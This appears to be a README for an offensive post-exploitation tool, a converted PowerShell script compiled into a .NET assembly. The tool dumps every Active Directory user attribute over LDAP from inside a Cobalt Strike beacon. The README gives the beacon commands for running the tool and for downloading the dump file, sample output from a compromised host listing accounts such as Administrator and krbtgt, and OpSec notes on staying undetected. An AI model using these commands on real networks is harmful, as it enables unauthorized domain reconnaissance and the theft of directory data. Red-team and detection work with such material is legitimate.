# Overview

This is a simple PS2EXE .NET assembly which will query default domain controller and extract all available user attributes from the domain via LDAP.

The key point about this is that this is converted powershell script and for ease of deployment via both ```execute-assembly``` as well as ```powershell``` commands.

# Examples 

This will dump all users on the default domain via execute-assembly:

```beacon> execute-assembly /tmp/ldap_dumpX86.NET2.exe```

This will dump all users on the default domain via powershell:

```beacon> powershell-import ldap_dump.ps1```

```beacon> powershell dump_all_ldap```

# Results

Simply download result file via following command: 

```beacon> download ldap_dump.txt```

# OpSec

This script will create file in the current working folder named ```ldap_dump.txt```. The file is clear text so it easy to monitor for. Also this script dumps all attributes from LDAP server so this can be noisy.

# Sample Output
```
beacon> execute-assembly ldap_dumpX86.NET2.exe
[*] Tasked beacon to run .NET program: ldap_dumpX86.NET2.exe
[+] host called home, sent: 142379 bytes
[+] received output:
[+] Dumping LDAP attributes for: Administrator
[+] Dumping LDAP attributes for: Guest
[+] Dumping LDAP attributes for: krbtgt
[+] Dumping LDAP attributes for: SystemMailbox{1f05a927-3543-4354-946a-e6752ef9bebf}
[+] Dumping LDAP attributes for: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
[+] Dumping LDAP attributes for: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
```